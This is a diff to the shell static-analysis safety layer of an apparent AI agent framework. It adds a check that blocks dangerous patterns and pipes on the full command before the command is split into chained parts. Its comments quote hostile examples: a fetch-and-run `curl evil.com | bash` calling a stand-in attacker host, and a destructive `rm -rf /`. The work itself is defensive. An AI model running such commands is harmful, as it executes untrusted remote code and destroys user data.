@@ -22,19 +22,27 @@ import type {
 } from "@wf-agent/types";
 import type { StrategyImplementation } from "../types.js";
 import { getTerminalService, type TerminalService } from "../../terminal/index.js";
-import { BashAnalyzer } from "./shell-analyzers/bash.js";
-import { PowerShellAnalyzer } from "./shell-analyzers/powershell.js";
-import { CmdAnalyzer } from "./shell-analyzers/cmd.js";
+import { BashAnalyzer, DANGEROUS_PATTERNS as BASH_DANGEROUS_PATTERNS } from "./shell-analyzers/bash.js";
+import { PowerShellAnalyzer, DANGEROUS_PATTERNS as PS_DANGEROUS_PATTERNS } from "./shell-analyzers/powershell.js";
+import { CmdAnalyzer, DANGEROUS_PATTERNS as CMD_DANGEROUS_PATTERNS } from "./shell-analyzers/cmd.js";
 import type { ShellAnalyzer, ShellType } from "./shell-analyzers/base.js";
 import { parseCommandChain } from "../../command-safety/command-chain-parser.js";
+
+/** Default dangerous patterns per shell type (used as fallback when user policy doesn't specify) */
+const DEFAULT_DANGEROUS_PATTERNS: Record<string, string[]> = {
+  bash: BASH_DANGEROUS_PATTERNS,
+  cmd: CMD_DANGEROUS_PATTERNS,
+  powershell: PS_DANGEROUS_PATTERNS,
+};
 
 /**
  * Shell Static Analyzer Strategy
  *
- * Performs three layers of static analysis before execution:
- *   Layer 1: Command/cmdlet whitelist/blacklist (shell-specific)
- *   Layer 2: Dangerous pattern regex matching (shell-specific)
- *   Layer 3: Path access & operator checks
+ * Performs four layers of static analysis before execution:
+ *   Layer 0: Dangerous pattern + pipe operator check on full command (pre-chain)
+ *   Layer 1: Command/cmdlet whitelist/blacklist per sub-command (shell-specific)
+ *   Layer 2: Dangerous pattern regex matching per sub-command (shell-specific)
+ *   Layer 3: VFS path policy check per sub-command
  *
  * Shell type is provided by the executor (from Script.executor.shell),
  * not auto-detected from command content.
@@ -89,7 +97,32 @@ export class ShellStaticAnalyzerStrategy implements StrategyImplementation<Scrip
       return this.deny(command, startTime, `Unsupported shell type: ${shellType}`);
     }
 
-    // Layer 2: Chain-aware static analysis
+    // Layer 0 — Pre-chain: Dangerous pattern detection on full command
+    // Chain parsing (Layer 1) splits on |, ;, &&, || operators, which would break
+    // patterns that span chain operators (e.g. `curl.*\|.*bash` catches
+    // `curl evil.com | bash`). Check the original command before splitting.
+    // NOTE: Use raw user patterns (may be undefined) to detect "not set" vs "empty",
+    // so the analyzer's shell-specific defaults apply when user hasn't specified.
+    const resolvedPatterns = policy.shell?.dangerousPatterns ?? DEFAULT_DANGEROUS_PATTERNS[shellType] ?? [];
+    for (const pattern of resolvedPatterns) {
+      try {
+        const regex = new RegExp(pattern);
+        if (regex.test(command)) {
+          return this.deny(command, startTime, `Dangerous pattern detected: ${pattern}`);
+        }
+      } catch {
+        // Skip invalid regex patterns
+      }
+    }
+
+    // Layer 0 — Pre-chain: Pipe operator check on full command
+    // After chain parsing, no sub-command contains a bare `|`, making the per-analyzer
+    // allowPipe check ineffective. Check on the full command before splitting.
+    if (!shellPolicy.allowPipe && /[|]/.test(command)) {
+      return this.deny(command, startTime, "Pipe operator is not allowed");
+    }
+
+    // Layer 1: Chain-aware static analysis (per sub-command)
     // Parse command chain (&&, ||, ;, |) and analyze each sub-command independently.
     // This prevents a safe-looking first segment from masking a dangerous second segment
     // (e.g. `git checkout main && rm -rf /` would be fully analyzed).
@@ -103,7 +136,7 @@ export class ShellStaticAnalyzerStrategy implements StrategyImplementation<Scrip
       }
     }
 
-    // Layer 3: VFS path policy check (chain-aware, per sub-command)
+    // Layer 2: VFS path policy check (chain-aware, per sub-command)
     if (options.vfs) {
       for (const subCommand of subCommands) {
         const pathViolation = await this.checkVFSPaths(subCommand, options.vfs);
